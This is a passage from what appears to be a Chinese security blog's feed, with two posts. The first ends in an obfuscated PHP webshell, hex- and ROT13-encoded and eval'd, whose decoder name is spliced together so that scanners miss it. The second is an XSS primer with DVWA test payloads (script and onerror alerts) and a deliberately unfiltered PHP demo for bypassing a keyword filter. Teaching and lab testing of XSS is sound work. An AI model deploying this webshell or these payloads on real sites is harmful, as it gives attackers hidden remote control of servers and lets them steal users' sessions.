jYxNnA3NTY1M3EyMjQzM24yczUyNDU0MzU5NDM0cDQ1NTIyczIyM3I1NzY5NnIycTUyNDU0MzU5NDM0cDQ1NTIzcDJzNnM3MDc0Njk2czZyM3IyNzNvMHEwbjY1NjM2ODZzMjAyNzNwNnM3MDc0Njk2czZyMjA3NjYxNnA3NTY1M3EyMjQzM24yczI0NTI2NTYzNzk2MzZwNjUycjQyNjk2cjJzMjIzcjU3Njk2cjJxMjQ1MjY1NjM3OTYzNnA2NTNwMnM2czcwNzQ2OTZzNnIzcjI3M28wcTBuNjU2MzY4NnMyMDI3M3A2czcwNzQ2OTZzNnIyMDc2NjE2cDc1NjUzcTIyNDMzbjJzNTA3MjZzNjc3MjYxNnEyMDQ2Njk2cDY1NzMyczIyM3I1NzY5NnIycTUwNzI2czY3NzI2MTZxM3AyczZzNzA3NDY5NnM2cjNyMjczbzBxMG42NTYzNjg2czIwMjczcDZzNzA3NDY5NnM2cjIwNzY2MTZwNzU2NTNxMjI0MzNuMnM0NDZzNjM3NTZxNjU2cjc0NzMyMDYxNnI2NDIwNTM2NTc0NzQ2OTZyNjc3MzJzNDE2cDZwMjA1NTczNjU3MjczMnM1Mzc0NjE3Mjc0MjA0cTY1NnI3NTJzNTA3MjZzNjc3MjYxNnE3MzJzNTM3NDYxNzI3NDc1NzAyczIyM3I1NzY5NnIycTUzNzQ2MTcyNzQ3NTcwM3AyczZzNzA3NDY5NnM2cjNyMjczbzBxMG42NTYzNjg2czIwMjczcDZzNzA3NDY5NnM2cjIwNzY2MTZwNzU2NTNxMjI0MzNuMnM0NDZzNjM3NTZxNjU2cjc0NzMyMDYxNnI2NDIwNTM2NTc0NzQ2OTZyNjc3MzJzNDE2cDZwMjA1NTczNjU3MjczMnNyMzgwOHByNW9wODByNW43OG9yMzgwOHFyODhzOXByNThxOTUyc3I3bjg4b3I1b244czJzcjU5MG5zcjU4bm44MnMyMjNyNTc2OTZyMnFyNTkwbnNyNThubjgzcDJzNnM3MDc0Njk2czZyM3IyNzNvMHEwbjY1NjM2ODZzMjAyNzNwNnM3MDc0Njk2czZyMjA3NjYxNnA3NTY1M3EyMjQzM24yczU3Njk2cjY0NnM3NzczMnM1NDY1NnE3MDJzMjIzcjU3Njk2cjJxNTQ0NTRxNTAzcDJzNnM3MDc0Njk2czZyM3IyNzNvMHEwbjY1NjM2ODZzMjAyNzNwNnM3MDc0Njk2czZyMjA3NjYxNnA3NTY1M3EyMjJzNzU3MzcyMnM2cDZzNjM2MTZwMnMyMjNyNHA2OTZyNzU3ODJxNnA2czYzNjE2cDNwMnM2czcwNzQ2OTZzNnIzcjI3M28wcTBuNjU2MzY4NnMyMDI3M3A2czcwNzQ2OTZzNnIyMDc2NjE2cDc1NjUzcTIyMnM3NDZxNzAyczIyM3I0cDY5NnI3NTc4MnE3NDZxNzAzcDJzNnM3MDc0Njk2czZyM3IyNzNvMHEwbjY1NjM2ODZzMjAyNzNwNnM3MDc0Njk2czZyMjA3NjYxNnA3NTY1M3EyMjJzNzY2MTcyMnM3NDZxNzAyczIyM3I0cDY5NnI3NTc4MnE3NjYxNzIzcDJzNnM3MDc0Njk2czZyM3IyNzNvMHEwbjY1NjM2ODZzMjAyNzNwNnM3MDc0Njk2czZyMjA3NjYxNnA3NTY1M3EyMjJzNjU3NDYzMnM3MzczNjgyczIyM3I0cDY5NnI3NTc4MnE3MzczNjgzcDJzNnM3MDc0Njk2czZyM3IyNzNvMHEwbjY1NjM2ODZzMjAyNzNwMnM3MzY1NnA2NTYzNzQzcjNwMnM2NjZzNzI2cTNyM3AyczY0Njk3NjNyM3A2NDY5NzYyMDYzNnA2MTczNzMzcTIyNjE2Mzc0NjE2cDZwMjIzcjI3M28wcTBuMHEwbjY1NjM2ODZzMjAyNzNwNjk2cjcwNzU3NDIwNzQ3OTcwNjUzcTIyNjI3NTc0NzQ2czZyMjIyMDc2NjE2cDc1NjUzcTIycjY5Nm8wcjVvb29ucjY5Njg3cjRvb282MjIyMDZzNnI2MzZwNjk2MzZvM3EyMjZyNjYyODVwMjc2NTY0Njk3NDVwMjcycDVwMjc2cjY1Nzc2NjY5NnA2NTJyNzA2ODcwNXAyNzI5M28yMjIwNzM3NDc5NnA2NTNxMjI3NzY5NjQ3NDY4M24zNjM4NzA3ODNvMjIzcjIwMjczbzBxMG42NTYzNjg2czIwMjczcDY5NnI3MDc1NzQyMDc0Nzk3MDY1M3EyMjYyNzU3NDc0NnM2cjIyMjA3NjYxNnA3NTY1M3EyMnI1ODg5b3I1b29vbnI3OW9ucnI1b3E5NTIyMjA2czZyNjM2cDY5NjM2bzNxMjI3NDc4NzQ3MzI4NXAyN3I3OW9ucnI1b3E5NXI1OTA4cTVwMjcycDVwMjc2cjY1Nzc2NDY5NzI1cDI3MnA1cDI3NjU1cDI3MjkzbzIyMjA3Mzc0Nzk2cDY1M3EyMjc3Njk2NDc0NjgzbjM2Mzg3MDc4M28yMjNyMjAyNzNvMHEwbjY1NjM2ODZzMjAyNzNwNjk2cjcwNzU3NDIwNzQ3OTcwNjUzcTIyNjI3NTc0NzQ2czZyMjIyMDc2NjE2cDc1NjUzcTIycjRvODhvcjhvcW9xcjY5Njg3cjRvb282MjIyMDZzNnI2MzZwNjk2MzZvM3EyMjc0Nzg3NDczMjg1cDI3cjRvODhvcjhvcW9xcjY5Njg3cjRvb282cjU4OG8wcjVvcTkzcjU4OThxcjc5b25ycjVvcTk1NXAyNzJwNXAyNzY4NzQ3NDcwM24yczJzNzc3Nzc3MnI2MjYxNjk2NDc1MnI2MzZzNnEyczYzNnE2NDJyNjU3ODY1NXAyNzJwNXAyNzY2NXAyNzI5M28yMjIwNzM3NDc5NnA2NTNxMjI3NzY5NjQ3NDY4M24zNjM4NzA3ODNvMjIzcjIwMjczbzBxMG42NTYzNjg2czIwMjczcDY5NnI3MDc1NzQyMDc0Nzk3MDY1M3EyMjYyNzU3NDc0NnM2cjIyMjA3NjYxNnA3NTY1M3EyMnI2ODlvOXI5ODc4c3I0bzg4bnI0b3BuMDIyMjA2czZyNjM2cDY5NjM2bzNxMjI2NzZzMjg1cDI3NzU3MDY2Njk2cDY1NzM1cDI3MnA1cDI3MjcycjI0NnI2czc3NjQ2OTcyMnIyNzVwMjcyOTNvMjIyMDczNzQ3OTZwNjUzcTIyNzc2OTY0NzQ2ODNuMzYzODcwNzgzbzIyM3IyMDI3M28wcTBuMHEwbjY1NjM2ODZzMjAyNzNwNjY2czcyNnEyMDZyNjE2cTY1M3EyMjc1NzA2NjcyNnEyMjIwNjk2NDNxMjI3NTcwNjY3MjZxMjIyMDZxNjU3NDY4NnM2NDNxMjI1MDRzNTM1NDIyMjA2NTZyNjM3NDc5NzA2NTNxMjI2cTc1NnA3NDY5NzA2MTcyNzQyczY2NnM3MjZxMnE2NDYxNzQ2MTIyM3IyNzNvMHEwbjczNzU2MjY1NzY2MTZwMjgyOTNvMHEwbjY1NjM2ODZzMjAyNzNwNjk2cjcwNzU3NDIwNzQ3OTcwNjUzcTIyNjg2OTY0NjQ2NTZyMjIyMDZyNjE2cTY1M3EyMjY0Njk3MjIyMjA2OTY0M3EyMjY0Njk3MjIyMjA3NjYxNnA3NTY1M3EyMjI3MnIyNDZyNnM3NzY0Njk3MjJyMjcyMjNyMjczbzBxMG42NTYzNjg2czIwMjczcDY5NnI3MDc1NzQyMDc0Nzk3MDY1M3EyMjY2Njk2cDY1MjIyMDZyNjE2cTY1M3EyMjc1NzA2NjY5NnA2NTIyMjA3Mzc0Nzk2cDY1M3EyMjc3Njk2NDc0NjgzbjMyMzgzNjcwNzgzbzY4NjU2OTY3Njg3NDNuMzIzMTcwNzgzbzIyM3IyMDI3M28wcTBuNjU2MzY4NnMyMDI3M3A2OTZyNzA3NTc0MjA3NDc5NzA2NTNxMjI2Mjc1NzQ3NDZzNnIyMjIwNnM2cjYzNnA2OTYzNm8zcTIyMjQyODVwMjc3NTcwNjY3MjZxNXAyNzI5MnI3Mzc1NjI2cTY5NzQyODI5M28yMjIwNzY2MTZwNzU2NTNxMjJyNG84OG5yNG9wbjAyMjIwNzM3NDc5NnA2NTNxMjI3NzY5NjQ3NDY4M24zNTMwNzA3ODNvMjIzcjIwMjczbzBxMG42NTYzNjg2czIwMjdyNG84OG5yNG9wbjByOTg3OHFyNTkxb3FyNTkwOHFyNG84b24yMDNwNjk2cjcwNzU3NDIwNzQ3OTcwNjUzcTIyNzQ2NTc4NzQyMjIwNnI2MTZxNjUzcTIyNzI2NTZyNjE2cTY1MjIyMDczNzQ3OTZwNjUzcTIyNzc2OTY0NzQ2ODNuMzEzMjM4NzA3ODNvMjIzcjI3M28wcTBuNjU2MzY4NnMyMDI3M3AyczY2NnM3MjZxM3IzcDJzNjQ2OTc2M3IyNzNvMHEwbjBxMG42NTYzNjg2czIwMjczcDY2NnM3MjZxMjA2cjYxNnE2NTNxMjI2NjcyNnEzMTIyMjA2OTY0M3EyMjY2NzI2cTMxMjIyMDZxNjU3NDY4NnM2NDNxMjI1MDRzNTM1NDIyM3IzcDc0NjE2MjZwNjUyMDYzNnA2MTczNzMzcTIyNzQ2MTYyNnA2NTczMjIzcjI3M28wcTBuNzM3NTYyNjU3NjYxNnAyODI5M28wcTBuNjU2MzY4NnMyMDI3M3A2OTZyNzA3NTc0MjA3NDc5NzA2NTNxMjI2ODY5NjQ2NDY1NnIyMjIwNnI2MTZxNjUzcTIyNjQ2OTcyMjIyMDY5NjQzcTIyNjQ2OTcyMjIyMDc2NjE2cDc1NjUzcTIyMjcycjI0NnI2czc3NjQ2OTcyMnIyNzIyM3IyNzNvMHEwbjY1NjM2ODZzMjAyNzNwNjk2cjcwNzU3NDIwNzQ3OTcwNjUzcTIyNjg2OTY0NjQ2NTZyMjIyMDZyNjE2cTY1M3EyMjYxNjM3NDIyMjA2OTY0M3EyMjYxNjM3NDIyMjA3NjYxNnA3NTY1M3EyMjIyM3IyNzNvMHEwbjY1NjM2ODZzMjAyNzNwNjk2cjcwNzU3NDIwNzQ3OTcwNjUzcTIyNjg2OTY0NjQ2NTZyMjIyMDZyNjE2cTY1M3EyMjc2NjE3MjIyMjA2OTY0M3EyMjc2NjE3MjIyMjA3NjYxNnA3NTY1M3EyMjIyM3IyNzNvMHEwbjY1NjM2ODZzMjAyNzNwNzQ2ODNyM3A2MTIwNjg3MjY1NjYzcTIyNm42MTc2NjE3MzYzNzI2OTcwNzQzbjYzNjQyODVwMjcyNzJyNjQ2OTcyNnI2MTZxNjUyODI0NnI2czc3NjQ2OTcyMjkycjI3MnM1cDI3MjkzbzIyM3JyNG84OG5yN29ubjdyNzlvbnJyNW9xOTUzcDJzNjEzcjNwMnM3NDY4M3IzcDc0NjgyMDczNzQ3OTZwNjUzcTIyNzc2OTY0NzQ2ODNuMzgyNTIyM3JyNjkzOHFyNG9xOXAzcDJzNzQ2ODNyM3A3NDY4MjA3Mzc0Nzk2cDY1M3EyMjc3Njk2NDc0NjgzbjM1MjUyMjNycjVvMTlycjY4MG43M3Ayczc0NjgzcjNwNzQ2ODIwNzM3NDc5NnA2NTNxMjI3NzY5NjQ3NDY4M24zMTM3MjUyMjNycjU4ODlvcjVvb29ucjY5N282cjk5N280M3Ayczc0NjgzcjNwNzQ2ODIwNzM3NDc5NnA2NTNxMjI3NzY5NjQ3NDY4M24zMTM3MjUyMjNycjRvc25ycjY5NG85cjY5N282cjk5N280M3Ayczc0NjgzcjNwNzQ2ODIwNzM3NDc5NnA2NTNxMjI3NzY5NjQ3NDY4M24zODI1MjIzcnI0bzg4b3I4b3FvcTNwMnM3NDY4M3IyNzNvMHEwbjY5NjYyODI0NjE3MjcyNjE3OTI5MjA3bzBxMG4wOTYxNzM2czcyNzQyODI0NjE3MjcyNjE3OTVvMjc2NDY5NzIyNzVxMjkzbzBxMG4wOTYxNzM2czcyNzQyODI0NjE3MjcyNjE3OTVvMjc2NjY5NnA2NTI3NXEyOTNvMHEwbjA5MjQ2NDZyNzU2cTIwM3EyMDI0NjY2cjc1NnEyMDNxMjAzMDNvMHEwbjA5NjY2czcyNjU2MTYzNjgyODI0NjE3MjcyNjE3OTVvMjc2NDY5NzIyNzVxMjA2MTczMjAyNDcwNjE3NDY4MjAzcTNyMjAyNDZyNjE2cTY1MjkyMDdvMHEwbjA5MDkyNDcwNzI2NTZxMjAzcTIwNzM3NTYyNzM3NDcyMjg2NDY1NjM2czYzNzQyODY2Njk2cDY1NzA2NTcyNnE3MzI4MjQ3MDYxNzQ2ODI5MjkycDJxMzQyOTNvMHEwbjA5MDkyNDYzNzQ2OTZxNjUyMDNxMjA2NDYxNzQ2NTI4Mjc1OTJxNnEycTY0MjA0ODNuNjkzbjczMjcycDY2Njk2cDY1NjM3NDY5NnE2NTI4MjQ3MDYxNzQ2ODI5MjkzbzBxMG4wOTA5MjQ2cTc0Njk2cTY1MjAzcTIwNjQ2MTc0NjUyODI3NTkycTZxMnE2NDIwNDgzbjY5M243MzI3MnA2NjY5NnA2NTZxNzQ2OTZxNjUyODI0NzA2MTc0NjgyOTI5M28wcTBuMDkwOTY1NjM2ODZzMjAyNzNwNzQ3MjNyMjczbzBxMG4wOTA5NjU2MzY4NnMyMDI3M3A3NDY0M3IzcDYxMjA2ODcyNjU2NjNxMjI2bjYxNzY2MTczNjM3MjY5NzA3NDNuNjM2NDI4NXAyNzI3MnIyNDZyNnM3NzY0Njk3MjJyMjQ2cjYxNnE2NTJyMjc1cDI3MjkzbzIyM3IzcDYyM3IyNzJyNzM3NDcyNzQ3MjI4MjQ2cjYxNnE2NTJwNjE3MjcyNjE3OTI4MjcyNTMyMzcyNzIwM3EzcjIwMjc1cDI3MjcycDI3MjUzMjMyMjcyMDNxM3IyMDI3MjIyNzI5MjkycjI3M3AyczYyM3IzcDJzNjEzcjNwMnM3NDY0M3IyNzNvMHEwbjA5MDk2NTYzNjg2czIwMjczcDc0NjQzcjNwNjEyMDY4NzI2NTY2M3EyMjZuNjE3NjYxNzM2MzcyNjk3MDc0M242NDY1NnA3MzI4NXAyNzI3MnIyNDZyNjE2cTY1MnIyNzVwMjcyOTNvMjIzcnI1ODhuMHI5OTluNDNwMnM2MTNyMjAyNzNvMHEwbjA5MDk2NTYzNjg2czIwMjczcDYxMjA2ODcyNjU2NjNxMjI2bjYxNzY2MTczNjM3MjY5NzA3NDNuNjE2Mzc0NzMyODVwMjcyNzJyMjQ2cjYxNnE2NTJyMjc1cDI3MnA1cDI3NzI2NjVwMjcycDVwMjcyNzJyMjQ2cjYxNnE2NTJyMjc1cDI3MjkzbzIyM3JyNjk0bzlyNTkwOHEzcDJzNjEzcjNwMnM3NDY0M3IyNzNvMHEwbjA5MDk2NTYzNjg2czIwMjczcDc0NjQzcjNwNjEyMDY4NzI2NTY2M3EyMjZuNjE3NjYxNzM2MzcyNjk3MDc0M242MTYzNzQ3MzI4NXAyNzI3MnIyNDcwNzI2NTZxMnIyNzVwMjcycDVwMjc3MDY0NXAyNzJwNXAyNzI3MnIyNDZyNjE2cTY1MnIyNzVwMjcyOTNvMjIzcjI3MnIyNDcwNzI2NTZxMnIyNzNwMnM2MTNyM3Ayczc0NjQzcjI3M28wcTBuMDkwOTY1NjM2ODZzMjAyNzNwNzQ2NDNyMjcycjI0NjM3NDY5NnE2NTJyMjczcDJzNzQ2NDNyMjczbzBxMG4wOTA5NjU2MzY4NnMyMDI3M3A3NDY0M3IyNzJyMjQ2cTc0Njk2cTY1MnIyNzNwMnM3NDY0M3IyNzNvMHEwbjA5MDk2NTYzNjg2czIwMjczcDc0NjQzcjJxM3Ayczc0NjQzcjI3M28wcTBuMDkwOTY1NjM2ODZzMjAyNzNwMnM3NDcyM3IyNzNvMHEwbjA5MDkyNDY0NnI3NTZxMm8ybzNvMHEwbjA5N3EwcTBuMDk2NjZzNzI2NTYxNjM2ODI4MjQ2MTcyNzI2MTc5NW8yNzY2Njk2cDY1Mjc1cTIwNjE3MzIwMjQ3MDYxNzQ2ODIwM3EzcjIwMjQ2cjYxNnE2NTI5MjA3bzBxMG4wOTA5MjQ3MDcyNjU2cTIwM3EyMDczNzU2MjczNzQ3MjI4NjQ2NTYzNnM2Mzc0Mjg2NjY5NnA2NTcwNjU3MjZxNzMyODI0NzA2MTc0NjgyOTI5MnAycTM0MjkzbzBxMG4wOTA5MjQ2Mzc0Njk2cTY1MjAzcTIwNjQ2MTc0NjUyODI3NTkycTZxMnE2NDIwNDgzbjY5M243MzI3MnA2NjY5NnA2NTYzNzQ2OTZxNjUyODI0NzA2MTc0NjgyOTI5M28wcTBuMDkwOTI0NnE3NDY5NnE2NTIwM3EyMDY0NjE3NDY1MjgyNzU5MnE2cTJxNjQyMDQ4M242OTNuNzMyNzJwNjY2OTZwNjU2cTc0Njk2cTY1MjgyNDcwNjE3NDY4MjkyOTNvMHEwbjA5MDkyNDczNjk3bjY1MjAzcTIwNzM2OTduNjUyODY2Njk2cDY1NzM2OTduNjUyODI0NzA2MTc0NjgyOTI5M28wcTBuMDkwOTY1NjM2ODZzMjAyNzNwNzQ3MjNyMjczbzBxMG4wOTA5NjU2MzY4NnMyMDI3M3A3NDY0M3IzcDY5NnI3MDc1NzQyMDc0Nzk3MDY1M3EyMjYzNjg2NTYzNm82MjZzNzgyMjIwNnI2MTZxNjUzcTIyNjY2OTZwNjU3MzVvNXEyMjIwNzY2MTZwNzU2NTNxMjIyNzJyMjQ2cjYxNnE2NTJyMjcyMjNyM3A2MTIwNzQ2MTcyNjc2NTc0M3EyMjVzNjI2cDYxNnI2bzIyMjA2ODcyNjU2NjNxMjIyNzJyMjQ3NDY4Njk3Mzc1NzI2cDJyMjQ2cjYxNnE2NTJyMjcyMjNyMjcycjczNzQ3Mjc0NzIyODI0NnI2MTZxNjUycDYxNzI3MjYxNzkyODI3MjUzMjM3MjcyMDNxM3IyMDI3NXAyNzI3MnAyNzI1MzIzMjI3MjAzcTNyMjAyNzIyMjcyOTI5MnIyNzNwMnM2MTNyM3Ayczc0NjQzcjI3M28wcTBuMDkwOTY1NjM2ODZzMjAyNzNwNzQ2NDNyM3A2MTIwNjg3MjY1NjYzcTIyNm42MTc2NjE3MzYzNzI2OTcwNzQzbjY3NnMyODVwMjc2NTY0Njk3NDVwMjcycDVwMjcyNzJyMjQ2cjYxNnE2NTJyMjc1cDI3MjkzbzIyM3JyN29wOTZyOG9yOTEzcDJzNjEzcjIwMjczbzBxMG4wOTA5NjU2MzY4NnMyMDI3M3A2MTIwNjg3MjY1NjYzcTIyNm42MTc2NjE3MzYzNzI2OTcwNzQzbjYxNjM3NDczMjg1cDI3MjcycjI0NnI2MTZxNjUycjI3NXAyNzJwNXAyNzcyNjY1cDI3MnA1cDI3MjcycjI0NnI2MTZxNjUycjI3NXAyNzI5M28yMjNycjY5NG85cjU5MDhxM3AyczYxM3IzcDJzNzQ2NDNyMjczbzBxMG4wOTA5NjU2MzY4NnMyMDI3M3A3NDY0M3IzcDYxMjA2ODcyNjU2NjNxMjI2bjYxNzY2MTczNjM3MjY5NzA3NDNuNjE2Mzc0NzMyODVwMjcyNzJyMjQ3MDcyNjU2cTJyMjc1cDI3MnA1cDI3NzA2NDVwMjcycDVwMjcyNzJyMjQ2cjYxNnE2NTJyMjc1cDI3MjkzbzIyM3IyNzJyMjQ3MDcyNjU2cTJyMjczcDJzNjEzcjNwMnM3NDY0M3IyNzNvMHEwbjA5MDk2NTYzNjg2czIwMjczcDc0NjQzcjI3MnIyNDYzNzQ2OTZxNjUycjI3M3Ayczc0NjQzcjI3M28wcTBuMDkwOTY1NjM2ODZzMjAyNzNwNzQ2NDNyMjcycjI0NnE3NDY5NnE2NTJyMjczcDJzNzQ2NDNyMjczbzBxMG4wOTA5NjU2MzY4NnMyMDI3M3A3NDY0MjA2MTZwNjk2NzZyM3EyMjcyNjk2NzY4NzQyMjNyM3A2MTIwNjg3MjY1NjYzcTIyNm42MTc2NjE3MzYzNzI2OTcwNzQzbjY3NnMyODVwMjc2NDZzNzc2cjVwMjcycDVwMjcyNzJyMjQ2cjYxNnE2NTJyMjc1cDI3MjkzbzIyM3IyNzJyMjQ3MzY5N242NTJyMjczcDJzNjEzcjNwMnM3NDY0M3IyNzNvMHEwbjA5MDk2NTYzNjg2czIwMjczcDJzNzQ3MjNyMjczbzBxMG4wOTA5MjQ2NjZyNzU2cTJvMm8zbzBxMG4wOTdxMHEwbjdxMHEwbjc1NnI3MzY1NzQyODI0NjE3MjcyNjE3OTI5M28wcTBuNjU2MzY4NnMyMDI3M3Ayczc0NjE2MjZwNjUzcjI3M28wcTBuNjU2MzY4NnMyMDI3M3A2NDY5NzYyMDYzNnA2MTczNzMzcTIyNjE2Mzc0NjE2cDZwMjIyMDczNzQ3OTZwNjUzcTIyNzQ2NTc4NzQycTYxNnA2OTY3NnIzbjZwNjU2Njc0M28yMjNyMjczbzBxMG42NTYzNjg2czIwMjczcDY5NnI3MDc1NzQyMDc0Nzk3MDY1M3EyMjYzNjg2NTYzNm82MjZzNzgyMjIwNjk2NDNxMjI2MzY4Nm82MTZwNnAyMjIwNnI2MTZxNjUzcTIyNjM2ODZvNjE2cDZwMjIyMDc2NjE2cDc1NjUzcTIyNnM2cjIyMjA2czZyNjM2cDY5NjM2bzNxMjI3MzYxMjg3NDY4Njk3MzJyNjY2czcyNnEyOTNvMjIzcjIwMjczbzBxMG42NTYzNjg2czIwMjczcDY5NnI3MDc1NzQyMDc0Nzk3MDY1M3EyMjYyNzU3NDc0NnM2cjIyMjA3NjYxNnA3NTY1M3EyMnI1bjQ4cXI1ODhvNjIyMjA3Mzc0Nzk2cDY1M3EyMjc3Njk2NDc0NjgzbjM1MzA3MDc4M28yMjIwNnM2cjYzNnA2OTYzNm8zcTVwMjc3NDc4NzQ3MzI4MjJyNW40OHFyNTg4bzZyOG83bnNyNW9yODQyMjJwMjIyNzJyMjQ2cjZzNzc2NDY5NzIycjI3MjIycDIyNjEyMjI5M281cDI3M3IyMDI3M28wcTBuNjU2MzY4NnMyMDI3M3A2OTZyNzA3NTc0MjA3NDc5NzA2NTNxMjI2Mjc1NzQ3NDZzNnIyMjIwNzY2MTZwNzU2NTNxMjJyNTg4bjByOTk5bjQyMjIwNzM3NDc5NnA2NTNxMjI3NzY5NjQ3NDY4M24zNTMwNzA3ODNvMjIyMDZzNnI2MzZwNjk2MzZvM3E1cDI3NjQ2NTZwNzMyODIyNjIyMjI5M281cDI3M3IyMDI3M28wcTBuNjU2MzY4NnMyMDI3M3A2OTZyNzA3NTc0MjA3NDc5NzA2NTNxMjI2Mjc1NzQ3NDZzNnIyMjIwNzY2MTZwNzU2NTNxMjJyNW8xOXJyNjgwbjcyMjIwNzM3NDc5NnA2NTNxMjI3NzY5NjQ3NDY4M24zNTMwNzA3ODNvMjIyMDZzNnI2MzZwNjk2MzZvM3E1cDI3NzQ3ODc0NzMyODIycjVvMTlycjY4MG43cjU4MG9wMjIycDIyMzAzNjM2MzYyMjJwMjI2MzIyMjkzbzVwMjczcjIwMjczbzBxMG42NTYzNjg2czIwMjczcDY5NnI3MDc1NzQyMDc0Nzk3MDY1M3EyMjYyNzU3NDc0NnM2cjIyMjA3NjYxNnA3NTY1M3EyMnI2OTdvNnI5OTdvNDIyMjA3Mzc0Nzk2cDY1M3EyMjc3Njk2NDc0NjgzbjM1MzA3MDc4M28yMjIwNnM2cjYzNnA2OTYzNm8zcTVwMjc3NDc4NzQ3MzI4MjJyNG9zbnJyNjk0bzlyNjk3bzZyOTk3bzQyMjJwMjIyNzJyMjQ2cTc0Njk2cTY1MnIyNzIyMnAyMjY0MjIyOTNvNXAyNzNyMjAyNzNvMHEwbjY1NjM2ODZzMjAyN3I3OW9ucnI1b3E5NTVvMjcycjI0NjQ2cjc1NnEycjI3NXEyMDJxMjByNjk2ODdyNG9vbzY1bzI3MnIyNDY2NnI3NTZxMnIyNzVxMjAycTIwcjVvMTlycjY4MG43NW8yNzJyMjQ2MzY4NnE2czY0MnIyNzVxM3AyczY0Njk3NjNyM3AyczY2NnM3MjZxM3IyNzNvMHEwbjYyNzI2NTYxNm8zbzBxMG43cSI7Cgkkc3RyID0gc3RyX3JvdDEzKCRzdHIpOwoJbSgkc3RyKTsKfQpmdW5jdGlvbiBtKCRzdHIpewoJZ2xvYmFsICRwYXNzd29yZDsKCSRqaiA9ICcnOwoJZXZhbCgkamoucGFjaygnSConLCRzdHIpLiRqaik7Cn0KcygpOw==&apos;;</span><br><span class="line">$jm=&quot;Base64_&quot;;</span><br><span class="line">$jm2=&quot;Decode&quot;;</span><br><span class="line">$jm3=$jm.$jm2; /*拼接出一个base64_decode*/</span><br><span class="line">$x=$jm3($a); /*解密webshell*/</span><br><span class="line">if (strlen($x)!=0)&#123;</span><br><span class="line">    $z=eval($x);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/01/13/FxPge0.png" alt="FxPge0.png"></p><p><img src="https://s2.ax1x.com/2019/01/13/FxPhYF.png" alt="FxPhYF.png"></p><p>最后为我们的天朝即刻群打波广告：欢迎加入即刻安全技术交流群，都是大佬，一言不合就开车直播群号：307283889</p><p><img src="https://s2.ax1x.com/2019/01/13/FxPqw6.png" alt="FxPqw6.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>xss summary</title>
      <link href="/posts/5104189a.html"/>
      <url>/posts/5104189a.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>学习xss漏洞，并加以总结。<br><img src="https://niuerdata.g.com.cn/data/shareimg_oss/big_media_img/2018/04/13/ce5d42ee64aae7cd3f3ae30b6edd529c.JPEG" alt="ce5d42ee64aae7cd3f3ae30b6edd529c.JPEG"></p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><b>漏洞起因</b><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可以输入的地方没有做好对应的过滤，引发的xss攻击</span><br><span class="line">```</span><br></pre></td></tr></table></figure></p><p><b>危害</b><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.盗取cookie</span><br><span class="line">2.劫持用户浏览器</span><br><span class="line">3.钓鱼攻击</span><br><span class="line">4.挂马</span><br><span class="line">5.在一定的条件下可以getshell</span><br><span class="line">6.会话劫持</span><br></pre></td></tr></table></figure></p><p><b>漏洞类型</b><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反射型XSS</span><br><span class="line">DOM型XSS</span><br><span class="line">存储型XSS</span><br><span class="line">其他型XSS 例如：Flash xss</span><br></pre></td></tr></table></figure></p><p><b>反射型xss</b><br>危险级别：低<br>插入的语句停留在当前页面。</p><p><b>DOMX型xss</b><br>危险级别：中<br>DOM型xss又分为两种<br>1.可见型<br>2.不可见型<br>插入的语句影响js</p><p><b>存储型xss</b><br>危险级别：高<br>插入的语句保存在数据库</p><p>DVWA测试：<br>在low级别下的测试，没有任何防御。可以插入任意标签如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;yuan&apos;)&lt;/script&gt;</span><br><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onclick=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/12/FjAytO.png" alt="FjAytO.png"></p><p>如果过滤了alert()如何绕过：</p><p>PHP代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$name=$_POST[&apos;name&apos;];</span><br><span class="line">$guanjianzi=&quot;alert&quot;;</span><br><span class="line">$q=str_replace(&quot;alert&quot;,&quot; &quot;,$name);</span><br><span class="line">echo $q;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Demo1&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;输入你的名称&lt;/h1&gt;</span><br><span class="line">&lt;form method=&quot;POST&quot; action=&quot;demo1.php&quot;&gt;</span><br><span class="line">    输入：&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot;&gt;提交&lt;/form&gt;</span><br><span 